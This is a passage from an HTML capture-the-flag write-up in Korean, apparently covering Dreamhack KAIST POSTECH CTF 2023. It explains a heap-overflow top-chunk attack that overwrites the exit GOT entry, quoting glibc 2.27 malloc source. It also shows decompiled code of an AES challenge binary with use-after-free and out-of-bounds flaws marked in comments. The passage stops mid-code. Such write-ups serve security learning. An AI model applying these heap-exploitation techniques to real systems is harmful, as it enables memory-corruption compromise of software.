</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">long</span>) (<span style="color:#a6e22e">size</span>) <span style="color:#f92672">&gt;=</span> (<span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">long</span>) (<span style="color:#a6e22e">nb</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">MINSIZE</span>))
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">remainder_size</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">size</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">nb</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">remainder</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chunk_at_offset</span> (<span style="color:#a6e22e">victim</span>, <span style="color:#a6e22e">nb</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">av</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">top</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">remainder</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">set_head</span> (<span style="color:#a6e22e">victim</span>, <span style="color:#a6e22e">nb</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">PREV_INUSE</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>                    (<span style="color:#a6e22e">av</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">main_arena</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">NON_MAIN_ARENA</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">set_head</span> (<span style="color:#a6e22e">remainder</span>, <span style="color:#a6e22e">remainder_size</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">PREV_INUSE</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">check_malloced_chunk</span> (<span style="color:#a6e22e">av</span>, <span style="color:#a6e22e">victim</span>, <span style="color:#a6e22e">nb</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chunk2mem</span> (<span style="color:#a6e22e">victim</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">alloc_perturb</span> (<span style="color:#a6e22e">p</span>, <span style="color:#a6e22e">bytes</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">p</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* When we are using atomic ops to free fast chunks we can get
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         here for all block sizes.  */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">atomic_load_relaxed</span> (<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">av</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">have_fastchunks</span>))
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">malloc_consolidate</span> (<span style="color:#a6e22e">av</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">/* restore original bin index */</span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_smallbin_range</span> (<span style="color:#a6e22e">nb</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">idx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">smallbin_index</span> (<span style="color:#a6e22e">nb</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">idx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">largebin_index</span> (<span style="color:#a6e22e">nb</span>);
</span></span><span style="display:flex;"><span>        }
</span></span></code></pre></div><p>glibc 2.27 소스를 확인해보면 chunk_at_offset에서 victim + nb를 하게 된다.
heap overflow로 size를 덮어서 검증을 우회하고, 0xffff까지의 입력을 넣을 수 있으니 sign extension이 발생하며 이를 이용해서 top chunk로 부터의 상대 주소로 접근할 수 있게된다.
0xffff의 입력은 page 단위로 올라가기 충분하며, got에 접근할 수 있다.
그걸 이용해 exit got를 덮는다.</p>
<h1 id="aespropective">Aespropective<a hidden class="anchor" aria-hidden="true" href="#aespropective">#</a></h1>
<h2 id="analysis-2">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-2">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  	<span style="color:#a6e22e">print_menu</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">istream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&gt;&gt;</span>((<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cin</span>, (<span style="color:#a6e22e">int64_t</span>)<span style="color:#a6e22e">sel</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( <span style="color:#a6e22e">sel</span>[<span style="color:#ae81ff">0</span>] )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">create_AES_obj</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">remove_AES_obj</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">set_plain_cipher_txt</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">enc</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dec</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cin</span>, <span style="color:#a6e22e">sel</span>);                    <span style="color:#75715e">// useless, not implemented yet
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}                                               <span style="color:#75715e">// UAF leads to memory leak
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>((<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, (<span style="color:#a6e22e">int64_t</span>)<span style="color:#e6db74">&#34;Enter key size: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">istream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&gt;&gt;</span>((<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cin</span>, (<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">keysz</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( <span style="color:#a6e22e">keysz</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">128</span><span style="color:#a6e22e">u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">v1</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">AES_obj</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">operator</span> <span style="color:#66d9ef">new</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">init_AES_128</span>(<span style="color:#a6e22e">v1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">aes_obj_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">192</span><span style="color:#a6e22e">u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">operator</span> <span style="color:#66d9ef">new</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">init_AES_192</span>(<span style="color:#a6e22e">v2</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">aes_obj_ptr</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">AES_obj</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">v2</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">256</span><span style="color:#a6e22e">u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">operator</span> <span style="color:#66d9ef">new</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">init_AES_256</span>(<span style="color:#a6e22e">v3</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">aes_obj_ptr</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">AES_obj</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">v3</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">v4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>((<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, (<span style="color:#a6e22e">int64_t</span>)<span style="color:#e6db74">&#34;No way&#34;</span>);
</span></span><span style="display:flex;"><span>        ((<span style="color:#66d9ef">void</span> (<span style="color:#a6e22e">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">__int64</span>, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>)(<span style="color:#a6e22e">v4</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">keysz</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">key_content</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">operator</span> <span style="color:#66d9ef">new</span>[](<span style="color:#a6e22e">keysz</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">set_cipher_key</span>(<span style="color:#a6e22e">key_content</span>, <span style="color:#a6e22e">keysz</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">key_schedule</span>(<span style="color:#a6e22e">aes_obj_ptr</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">key_content</span>);<span style="color:#75715e">// AES256 OoB. Key corrupted.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(
</span></span><span style="display:flex;"><span>           (<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>,
</span></span><span style="display:flex;"><span>           (<span style="color:#a6e22e">int64_t</span>)<span style="color:#e6db74">&#34;This is sha256 for the encryption key: &#34;</span>);
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">void</span> (<span style="color:#a6e22e">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">__int64</span>, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>)(<span style="color:#a6e22e">v5</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sha256</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">hashed_output</span>, <span style="color:#a6e22e">aes_obj_ptr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v6</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#a6e22e">hashed_output</span>);
</span></span></code></pre></div><p>키 사이즈에 따른 aes 객체들이 구현되어있다.
<img loading="lazy" src="/balog/Dreamhack_KAIST_POSTECH_CTF_2023/vtables.png" alt=""  />

리버싱한 결과, AES ECB임이 확인되었다.
그리고 따로 처음에 키 스케쥴링 로직도 확인되었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">v6</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">operator</span> <span style="color:#66d9ef">new</span>[](<span style="color:#ae81ff">0xB0</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_DWORD</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">key_back</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_DWORD</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">rcon</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">15</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">key_content</span>[<span style="color:#a6e22e">i</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xAF</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">key_back</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">key_back</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">key_back</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">key_back</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( ((<span style="color:#a6e22e">j</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )                   <span style="color:#75715e">// multiples of 4, means following logics applied at roundkey&#39;s first col 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">Rot_word</span>(<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key_back</span>);                  <span style="color:#75715e">// shift upwards
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">Sub_bytes</span>(<span style="color:#a6e22e">obj</span>, (<span style="color:#a6e22e">int8_t</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">key_back</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">set_rcon</span>(<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">rcon</span>, <span style="color:#a6e22e">j</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">add_rcon</span>(<span style="color:#a6e22e">obj</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">key_back</span>, <span style="color:#a6e22e">rcon</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">key_back</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">key_back</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">key_back</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">15</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">key_back</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">14</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">key_back</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> <span style="color:#a6e22e">obj</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">13</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>) <span style="color:#f92672">^</span> <span style="color:#a6e22e">v6</span>;
</span></span><span style="display:flex;"><span>}                                               <span style="color:#75715e">// do keyscheduling
</span></span></span></code></pre></div><p>이런식으로 처음에 round key들을 미리 계산한다.</p>
<h2 id="exploitation-2">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation-2">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">unsigned</span> <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">v6</span>; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">v6</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">operator</span> <span style="color:#66d9ef">new</span>[](<span style="color:#ae81ff">0xD0</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v4</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">23</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">key_content</span>[<span style="color:#a6e22e">i</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xCF</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">LOWORD</span>(<span style="color:#a6e22e">v4</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_WORD</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">BYTE2</span>(<span style="color:#a6e22e">v4</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HIBYTE</span>(<span style="color:#a6e22e">v4</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>];
